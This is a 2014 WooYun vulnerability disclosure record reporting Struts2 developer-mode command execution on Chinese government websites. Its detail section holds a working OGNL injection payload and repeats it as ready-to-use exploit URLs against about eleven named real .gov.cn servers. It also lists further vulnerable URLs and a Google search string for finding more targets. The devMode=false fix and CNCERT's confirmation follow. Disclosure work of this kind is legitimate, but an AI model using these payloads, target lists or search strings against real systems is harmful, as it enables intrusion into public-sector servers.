{"id": 58725, "wybug_id": "wooyun-2014-049979", "wybug_title": "某些地方zf站点Struts2命令执行漏洞打包", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "VIP", "wybug_date": "2014-01-28 10:54", "wybug_open_date": "2014-03-14 10:54", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["远程命令执行"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-01-28：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-02-01：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-02-11：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-02-21：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-03-03：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-03-14：\t细节向公众公开  简要描述： 开发者调试模式惹的祸 详细说明：  Struts2开发者模式开启情况下可以执行命令，如\n?debug=command&expression=%23_memberAccess[\"allowStaticMethodAccess\"]=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23xman=@org.apache.struts2.ServletActionContext@getResponse(),%23xman.getWriter().println(%23req.getRealPath(\"/\")),%23xman.getWriter().close()\n   漏洞证明：  以下是存在漏洞并可利用的\nhttp://hdsfj.bjhd.gov.cn:8080/loginInAction.action?debug=command&expression=%23_memberAccess[%22allowStaticMethodAccess%22]=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23xman=@org.apache.struts2.ServletActionContext@getResponse(),%23xman.getWriter().println(%23req.getRealPath(%22/%22)),%23xman.getWriter().close()http://www.smetjhx.gov.cn/disp.jsp?debug=command&expression=%23_memberAccess[%22allowStaticMethodAccess%22]=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23xman=@org.apache.struts2.ServletActionContext@getResponse(),%23xman.getWriter().println(%23req.getRealPath(%22/%22)),%23xman.getWriter().close()http://jinrong.smetj.gov.cn/dispFP.action?debug=command&expression=%23_memberAccess[%22allowStaticMethodAccess%22]=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23xman=@org.apache.struts2.ServletActionContext@getResponse(),%23xman.getWriter().println(%23req.getRealPath(%22/%22)),%23xman.getWriter().close()http://www.jl.lm.gov.cn/renCaiGerenAction.do?debug=command&expression=%23_memberAccess[%22allowStaticMethodAccess%22]=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23xman=@org.apache.struts2.ServletActionContext@getResponse(),%23xman.getWriter().println(%23req.getRealPath(%22/%22)),%23xman.getWriter().close()http://www.smetjhx.gov.cn/sub.jsp?debug=command&expression=%23_memberAccess[%22allowStaticMethodAccess%22]=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23xman=@org.apache.struts2.ServletActionContext@getResponse(),%23xman.getWriter().println(%23req.getRealPath(%22/%22)),%23xman.getWriter().close()http://wz.st.gov.cn/stwz/voteOut_wap/voteOut!inputOutVote.action?debug=command&expression=%23_memberAccess[%22allowStaticMethodAccess%22]=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23xman=@org.apache.struts2.ServletActionContext@getResponse(),%23xman.getWriter().println(%23req.getRealPath(%22/%22)),%23xman.getWriter().close()http://www.jhjxw.gov.cn:90/report/loginAction!login.shtml?debug=command&expression=%23_memberAccess[%22allowStaticMethodAccess%22]=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23xman=@org.apache.struts2.ServletActionContext@getResponse(),%23xman.getWriter().println(%23req.getRealPath(%22/%22)),%23xman.getWriter().close()http://rsks.mwr.gov.cn/zcxxfw/xxfw/portal/yhzc!login.do?debug=command&expression=%23_memberAccess[%22allowStaticMethodAccess%22]=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23xman=@org.apache.struts2.ServletActionContext@getResponse(),%23xman.getWriter().println(%23req.getRealPath(%22/%22)),%23xman.getWriter().close()http://zjhlwjc.zjfda.gov.cn/dim_out/public/showMedicineSdaByDrugCode.action?debug=command&expression=%23_memberAccess[%22allowStaticMethodAccess%22]=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23xman=@org.apache.struts2.ServletActionContext@getResponse(),%23xman.getWriter().println(%23req.getRealPath(%22/%22)),%23xman.getWriter().close()http://www.zwhrss.gov.cn/zwhr/findThreeTrain_findTrainIntudy.action?debug=command&expression=%23_memberAccess[%22allowStaticMethodAccess%22]=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23xman=@org.apache.struts2.ServletActionContext@getResponse(),%23xman.getWriter().println(%23req.getRealPath(%22/%22)),%23xman.getWriter().close()http://ysq.hwcc.gov.cn/alarm?debug=command&expression=%23_memberAccess[%22allowStaticMethodAccess%22]=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23xman=@org.apache.struts2.ServletActionContext@getResponse(),%23xman.getWriter().println(%23req.getRealPath(%22/%22)),%23xman.getWriter().close()\n以下无回显，但开启了开发者模式，存在安全隐患\nhttp://www3.bjxch.gov.cn/getItemDefineByitemtype.actionhttp://www.ahcz.gov.cn:8090/download2.dohttp://mice.pudong.gov.cn:8080/page/activity_newsMore.actionhttp://www.gzgjj.gov.cn/cs/actions/public/clickStatisticsPublicAction$addClicks.actionhttp://wap.sz.gov.cn/admin/MDML!tableList.actionhttp://www.naggzy.gov.cn/upload!downCurFile.actionhttp://wsbs.jieyang.gov.cn/wsdt/showApplyhttp://m.wenzhou.gov.cn/secllisthttp://www.naggzy.gov.cn/articleWeb!view.actionhttp://ggzy.yishui.gov.cn/index!index.actionhttp://jz.whlib.gov.cn/webs/survey_userSurvey.action\n还有没有许多列举到的，可自行谷歌\nStruts Problem Report site:gov.cn\n排查   修复方案：  在WEB-INF/classes/struts.properties文件中加入下面的内容，将开发者模式关闭\nstruts.devMode=false\n   版权声明：转载请注明来源 VIP@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-02-01 22:49 厂商回复： CNVD确认并复现所述情况，对于涉及的政府网站案例，已经转由CNCERT下发给所属多个分中心，涉及的水利部子站已经转由CNCERT直接通报水利部信息中心处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-01-28 11:53 |    \t\tVIP \t\t\t( 普通白帽子  |\t\t\t        Rank:759 漏洞数:100        )\t\t \n  果然小厂商    \n     2014-02-02 12:40 |    \t\tVIP \t\t\t( 普通白帽子  |\t\t\t        Rank:759 漏洞数:100        )\t\t \n  @cncert国家互联网应急中心 大年初三就上班，辛苦了    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}